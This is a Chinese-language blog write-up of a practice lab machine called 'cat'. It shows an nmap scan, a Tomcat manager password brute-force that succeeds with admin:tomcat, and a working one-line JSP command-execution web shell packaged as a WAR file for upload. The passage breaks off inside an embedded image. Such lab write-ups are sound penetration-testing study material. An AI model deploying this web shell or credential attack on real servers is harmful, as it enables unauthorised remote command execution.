@@ -1,0 +1,319 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  
+  <title>cat | Hexo</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta name="description" content="扫描： 12345678910111213141516171819202122232425┌──(root㉿kali)-[&#x2F;home&#x2F;kali1]└─# nmap -A 192.168.5.13Starting Nmap 7.94SVN ( https:&#x2F;&#x2F;nmap.org ) at 2026-07-11 09:16 CSTStats: 0:01:15 elapsed; 0 hosts compl">
+<meta property="og:type" content="article">
+<meta property="og:title" content="cat">
+<meta property="og:url" content="https://lly-1122.github.io/catblog/2026/09/18/cat/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="扫描： 12345678910111213141516171819202122232425┌──(root㉿kali)-[&#x2F;home&#x2F;kali1]└─# nmap -A 192.168.5.13Starting Nmap 7.94SVN ( https:&#x2F;&#x2F;nmap.org ) at 2026-07-11 09:16 CSTStats: 0:01:15 elapsed; 0 hosts compl">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2026-09-18T07:07:55.000Z">
+<meta property="article:modified_time" content="2026-10-12T11:20:45.640Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="MazeSec">
+<meta property="article:tag" content="cat">
+<meta property="article:tag" content="nmap">
+<meta property="article:tag" content="提权">
+<meta property="article:tag" content="渗透测试">
+<meta name="twitter:card" content="summary">
+  
+    <link rel="alternate" href="/catblog/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/catblog/favicon.png">
+  
+  
+  
+<link rel="stylesheet" href="/catblog/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/catblog/fancybox/jquery.fancybox.min.css">
+
+  
+  
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/fork-awesome@1.2.0/css/fork-awesome.min.css">
+
+<meta name="generator" content="Hexo 8.1.2"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/catblog/" id="logo">Hexo</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"><span class="fa fa-bars"></span></a>
+        
+          <a class="main-nav-link" href="/catblog/">Home</a>
+        
+          <a class="main-nav-link" href="/catblog/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+        
+          <a class="nav-icon" href="/catblog/atom.xml" title="RSS Feed"><span class="fa fa-rss"></span></a>
+        
+        <a class="nav-icon nav-search-btn" title="Search"><span class="fa fa-search"></span></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="https://lly-1122.github.io/catblog"></form>
+      </div>
+    </div>
+  </div>
+</header>
+
+      <div class="outer">
+        <section id="main"><article id="post-cat" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/catblog/2026/09/18/cat/" class="article-date">
+  <time class="dt-published" datetime="2026-09-18T07:07:55.000Z" itemprop="datePublished">2026-09-18</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/catblog/categories/%E9%9D%B6%E5%9C%BAwriteup/">靶场writeup</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="p-name article-title" itemprop="headline name">
+      cat
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p>扫描：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[/home/kali1]</span><br><span class="line">└─# nmap -A 192.168.5.13</span><br><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-07-11 09:16 CST</span><br><span class="line">Stats: 0:01:15 elapsed; 0 hosts completed (1 up), 1 undergoing Traceroute</span><br><span class="line">Traceroute Timing: About 32.26% <span class="keyword">done</span>; ETC: 09:18 (0:00:00 remaining)</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.5.13 (192.168.5.13)</span><br><span class="line">Host is up (0.0087s latency).</span><br><span class="line">Not shown: 996 closed tcp ports (reset)</span><br><span class="line">PORT     STATE    SERVICE    VERSION</span><br><span class="line">22/tcp   open     tcpwrapped</span><br><span class="line">| ssh-hostkey:</span><br><span class="line">|   3072 f6:a3:b6:78:c4:62:af:44:bb:1a:a0:0c:08:6b:98:f7 (RSA)</span><br><span class="line">|   256 bb:e8:a2:31:d4:05:a9:c9:31:ff:62:f6:32:84:21:9d (ECDSA)</span><br><span class="line">|_  256 3b:ae:34:64:4f:a5:75:b9:4a:b9:81:f9:89:76:99:eb (ED25519)</span><br><span class="line">80/tcp   open     tcpwrapped</span><br><span class="line">|_http-title: \xE9\x9D\x99\xE5\xA4\x9C\xC2\xB7\xE7\x8C\xAB\xE5\xBD\xB1</span><br><span class="line">|_http-server-header: Apache/2.4.62 (Debian)</span><br><span class="line">514/tcp  filtered shell</span><br><span class="line">8080/tcp open     tcpwrapped</span><br><span class="line">|_http-open-proxy: Proxy might be redirecting requests</span><br><span class="line">|_http-favicon: Apache Tomcat</span><br><span class="line">|_http-title: Apache Tomcat/10.1.20</span><br><span class="line">Aggressive OS guesses: Actiontec MI424WR-GEN3I WAP (99%), DD-WRT v24-sp2 (Linux 2.4.37) (97%), Linux 3.2 (96%), Microsoft Windows XP SP3 or Windows 7 or Windows Server 2012 (96%), Linux 4.4 (94%), Microsoft Windows XP SP3 (94%), BlueArc Titan 2100 NAS device (90%), VMware Player virtual NAT device (89%)</span><br><span class="line">No exact OS matches <span class="keyword">for</span> host (<span class="built_in">test</span> conditions non-ideal).</span><br><span class="line">Network Distance: 2 hops</span><br></pre></td></tr></table></figure>
+
+<p>然后访问80端口的话没有什么有用信息的，8080端口则是一个tomcat搭建完成的默认页面，并且有manager页面可以登录，所以这里dirsearch的意义不是很大。</p>
+<p>getshell</p>
+<p>所以其实突破点就很明显了，就是manager页面可能是一个弱密码就可以登录了，然后我上网搜了一些渗透tomcat的脚本，搜到一个：<a target="_blank" rel="noopener" href="https://github.com/magicming200/tomcat-weak-password-scanner">magicming200&#x2F;tomcat-weak-password-scanner: 醉考拉tomcat后台弱口令扫描器，命令行版+图形界面版。</a></p>
+<p>额，这个项目挺小众的，然后我就试了一下，得到密码为admin:tomcat</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[/home/kali1/cat/TomcatScanPro]</span><br><span class="line">└─# <span class="built_in">cat</span> data/urls.txt</span><br><span class="line">http://192.168.5.13:8080/manager/html</span><br><span class="line"></span><br><span class="line">┌──(root㉿kali)-[/home/kali1/cat/TomcatScanPro]</span><br><span class="line">└─# python TomcatScanPro.py</span><br><span class="line">根据用户名和密码组合总数 5055 调整线程池大小为 127</span><br><span class="line">[-] 失败: CVE-2017-12615 漏洞利用方式1 (405) http://192.168.5.13:8080/8vTk2t.jsp/</span><br><span class="line">[-] 失败: CVE-2017-12615 漏洞利用方式2 (405) http://192.168.5.13:8080/8vTk2t.jsp%20</span><br><span class="line">[-] 失败: CVE-2017-12615 漏洞利用方式3 (405) http://192.168.5.13:8080/8vTk2t.jsp::<span class="variable">$DATA</span></span><br><span class="line">[-] 失败: CNVD-2020-10487 http://192.168.5.13:8080 [Errno 111] Connection refused</span><br><span class="line">[-] 失败: tomcat:tomcat (401) http://192.168.5.13:8080/manager/html</span><br><span class="line">......</span><br><span class="line">[+] 登录成功 http://192.168.5.13:8080/manager/html admin:tomcat</span><br></pre></td></tr></table></figure>
+
+<p>登录上去之后就可以利用tomcat的war部署网站的功能上传一个jsp一句话木马。然后反弹shell</p>
+<p>额找一个简单的木马就行其实能让服务器运行就可以</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;% <span class="keyword">if</span>(<span class="string">&quot;023&quot;</span>.equals(request.getParameter(<span class="string">&quot;pwd&quot;</span>)))&#123; java.io.InputStream <span class="keyword">in</span> = Runtime.getRuntime().<span class="built_in">exec</span>(request.getParameter(<span class="string">&quot;i&quot;</span>)).getInputStream(); int a = -1; byte[] b = new byte[2048]; out.print(<span class="string">&quot;&lt;pre&gt;&quot;</span>); <span class="keyword">while</span>((a=in.read(b))!=-1)&#123; out.println(new String(b)); &#125; out.print(<span class="string">&quot;&lt;/pre&gt;&quot;</span>); &#125; %&gt;</span><br></pre></td></tr></table></figure>
+
+<p>使用jar打包</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#语法 jar cvf 打包文件名 打包的目标文件</span></span><br><span class="line">jar cvf index.war shell.jsp</span><br></pre></td></tr></table></figure>
+
+<p>上传到tomcat服务器上之后就会自动解压成一个为index的目录种带有shell.jsp的网站</p>
+<p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAABK0AAAEdCAYAAADOy5QAAAAgAElEQVR4nO3df3gU9b33/xckELpJQCLBCkoQaAVUDoi2ATwB6kkICpxjpd8YEHunQYKKxXhI7+OlYkBbvldjiyi0oqS576Oy5lu88RaUSNqD0AJpBc2holiIEixUCeVXkoUAId8/Zmcy+3vze8Dn47q4NLuzM5+ZnZndee3n855uKYMHNwkAAAAAAABwkO5d3QAAAAAAAADAH6EVAAAAAAAAHIfQCgAAAAAAAI5DaAUAAAAAAADHIbQCAAAAAACA48S29AV9eveWJLlcLsXGtvjlAMK4cOGCJKmhoUEN586pvr6+i1sEAAAAAEDXiDp1iouLU1LfvgRVQAcyj6/Y2FjFx8erd2KiPB6PTp0+3cUtAwAAAACgc0WVQPXp3Vu9vT2sAHSe2NhY69gjuAIAAAAAfJ1ErGlFYAV0vd69e1tDcwEAAAAA+DoIG1rFxcURWAEO0bt3b8XHx3d1MwAAAAAA6BRhQ6ukvn07qx0AotA7MbGrmwAAAAAAQKcIWdMqPj4+bNH1P/7xj21a8G233dam1wNfR7GxsYqLi1NDQ0NXNwVAK13Vv78k6aujR7u4JQAAAICzhUyl4nr2jPjipqamVi20W7durXodAKPO3NGamnaZl8vl0h1Tp2rixIlKTk6WJFVXV+vgwYNa98Ybqmmn5QBo1jOKz1cAAAAA4UKruLjObAeAKMXExLTLfNLS0vQ/fvhDuVwun8dTUlKUkpKiW2+9Vb9dt06bNm1q8bxzc3M1OCVFTy5e3C5tBQAAAAB8/YQMrcINDYzG4sd/ou/9yxRNmny7JOkvf9mjdb/9rX7yP/+jTfOFc73wwgv68ssv9dOf/rRVr/3000+1cuXKDmiZr9WrV2vjxo3asGFDi17Xr18/1dfX68yZMx3Uss4zceJEPTB/fthpXC6Xfnjffaqvr9e2bdtaNP/i4mK97naHfP51t1vlv/udiouLjenXrFHu3LnWc8Gsdbv11ltvWdMUFRVp9wcfWM8/vXSpTp8+raJnn/V57Fvf+lZUbd6/fz8hGy4Zi598UpK09Omnu7glAAAAQMdpWzJlU19fL0nW3c2GXi39Zed6VX+6U2fONugbsQ0a0Kd1dXjcbrc++ugjnzBk8uTJmjdvnvX3Sy+9pC1btkiSFixYoAkTJljPbdiwQWvXrm3R/IPNJzs7O+iyQ83/8ccf14033mj9fezYMT388MNtWk+zDf4itcltCwLsz7X2df7Lfemll0KuV2crLi7Whx9+2CkBWLSmTZum3r17B2y/WbNm6fTp09q4cWPU82proCxJ77//vn54331yuVyqqanRO5s2adeuXW2eb8GiRRo7dqz1txlArXW7Ncu2796Tna2xN98cdB73hNjH7cuQpIKCAuux/fv3W+GUucyvvvpKCx95JOD1xWvW6Fe/+pVP4AUEM33aNPXu00evvfaaz+OzZ8/WqZMntfHtt7uoZQAAAMDXQ5uvfuvr67Vv3z717NlDy5b9v7rzzjs1e/Zs9b+yr+4ed1LVNTXqf8VFqfGcPjpyZYvm/cILL6hfv346ePBgwHPz5s2zQpQFCxbo3nvvtUKr66+/3gp3FixYoOnTpwcNlcLNf8GCBRozZkzQkOjee+/V9u3btXLlSs2aNSvk/BMSEoKGYS1pR0ZGhtWGZcuW6YUXXggafIVrU3FxsfWc//Zo7etM48eP18GDB7VlyxZr+3elWbNmSZKjAitJ6t27t6ZPny5J1jY0t/fbnXzh+8P77tNv163TO5s2aWJampY+/bRV20qS3tm0STU1NZp5991Wnau9H38cVW+romef9ek1lZuba92F1L8n0+4PPlDxmjVW0P26263du3f79JTyN2PGDI0dO1a7d++2lidJK557TkVFRfq3f/s3vfnmmz6B1IwZM3wCM8k38JLk0+sLMPXu00fTp02TJCu4mj17tqZPm9aioBkAAABA67Q5tPrssyoNHjxYV155pV5++WV9+eWXem/L73Xg88O65bo4Ha2N15cnz+q65O46fuYK6wI1GmY4s2zZMp/HFyxYoGPHjlkX/ytXrlRxcbFmzZqltWvX+oQ6K1eu1IQJEzR58uSAUCXU/CVpzJgxevXVV4O2y+Vyae/evZKMAGL69OlB5y9Jp06davV6StJjjz1m/f/hw4d1/fXXt6hNV199taTmEGflypUaM2aMFixYoJUrV7b6daYhQ4bo97//fcR17Cw33XSTPvvss65uRgBzX50+fbq6deumpqYmTZ8+XRs3bgzoxdHRRo4cqR/MnKnfrltnBaVPLV5s1baaOHGilixdqnqPRzMnTrReE+0QwV/96lcqXrNG//ettzTqppu08JFHNGPGjKDT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